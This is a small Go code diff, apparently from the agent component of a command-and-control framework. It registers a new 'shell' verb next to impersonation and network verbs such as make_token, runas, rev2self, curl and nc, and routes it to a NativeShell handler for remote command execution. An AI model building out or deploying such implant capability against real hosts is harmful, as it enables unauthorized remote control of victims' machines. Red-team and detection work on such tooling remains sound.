@@ -2379,6 +2379,7 @@ var nativeExtraVerbs = map[string]bool{
 	"make_token": true,
 	"runas":      true,
 	"rev2self":   true,
+	"shell":      true,
 }
 
 func isNativeExtraVerb(verb string) bool {
@@ -2515,6 +2516,7 @@ func (a *Agent) nativeExtraVerb(t protocol.Task) protocol.Result {
 			return protocol.Result{ID: t.ID, Error: err.Error()}
 		}
 		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
+	case "shell":      return NativeShell(t)
 	case "curl":    return NativeCurl(t)
 	case "resolve": return NativeResolve(t)
 	case "nc":         return NativeNc(t)
